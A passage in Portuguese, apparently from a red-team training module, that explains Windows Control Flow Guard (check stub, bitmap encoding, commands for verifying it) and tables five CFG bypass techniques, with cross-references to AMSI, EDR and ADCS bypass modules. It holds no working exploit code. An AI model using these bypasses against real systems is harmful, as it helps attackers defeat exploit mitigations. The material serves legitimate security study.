Compilador insere stub de verificação antes de todo `call [reg]` ou `jmp [reg]`:

```asm
; Código compilado com /guard:cf (MSVC)
mov  ecx, [reg]              ; endereço alvo da call indireta
call __guard_check_icall     ; verifica no bitmap CFG
                             ; se inválido → RaiseFailFastException → processo termina
call ecx                     ; executa (se passou na verificação)
```

**Bitmap de validação:**
- **2 bits** por cada alinhamento de **16 bytes** na VAS do processo
- 64-bit: bitmap de 2 TB (respaldado por page-file)
- Codificação dos bits `{b1, b0}`:
  - `{0, 0}` → **não** é início válido de função
  - `{1, 0}` → função começa **exatamente** neste alinhamento de 16 bytes
  - `{1, 1}` → função existe em algum ponto dentro desta janela de 16 bytes

### Verificar CFG em Módulo

```cmd
:: Verificar se módulo tem CFG
dumpbin /headers module.dll | grep -i "guard"
:: → "Guard CF function table present" = CFG ativo

:: Verificar imports
dumpbin /imports module.exe | grep -i "__guard_check"
```

### Bypass CFG — 5 Técnicas

| Técnica | Detalhe |
|---------|---------|
| **Sobrescrever ponteiro de função válida** | Alvo sempre aponta para função legítima → executar gadget ROP a partir dela |
| **SetProcessValidCallTargets** | API que marca regiões como válidas no bitmap — requer `VirtualProtect` + admin access |
| **CFG Export Suppression** | Algumas funções exportadas são suprimidas do bitmap — buscar com `dumpbin /exports` |
| **Alocar exec + marcar CFG-valid** | `VirtualAlloc(PAGE_EXECUTE)` + `SetProcessValidCallTargets` → cria função válida no bitmap |
| **Heap spray em endereço alinhado** | Se alvo estiver em range `{1,1}` no bitmap → execução permitida |

**Limitação importante:** CFG só é eficaz se **todos** os módulos carregados foram compilados com CFG. Um único módulo sem CFG com um gadget utilizável compromete a proteção.

```powershell
# Verificar processos com CFG ativo
Get-ProcessMitigation -Id (Get-Process notepad).Id | Select CFG
# CFG.Enable = ON + MicrosoftSignedOnly = ON = proteção máxima
```

---

## Módulos Relacionados

`03_amsi_bypass.md` complementa WDAC pra scripts PowerShell — ambos precisam ser bypassados em conjunto. `06_edr_telemetria_e_hooking.md` cobre o cenário onde EDR detecta LOLBINs mesmo com WDAC permitindo a execução. `09_active_directory/10_adcs_attacks.md` mostra ESC1/ESC3 pra obter certificados de code signing via ADCS. MITRE ATT&CK: T1553.001 (Code Signing), T1218 (Signed Binary Proxy Execution), T1218.004 (InstallUtil), T1218.009 (RegSvcs/RegAsm).

---

## Leitura Complementar

- Microsoft Docs — Windows Defender Application Control design guide
- mattifestation — WDAC policy research
- SpecterOps — WDAC bypass techniques (posts 2021–2023)
- Exploit.ph — LOLBins and WDAC
- Ferramentas: Certify, ForgeCert, CiTool.exe, ConvertFrom-CIPolicy, MSBuild
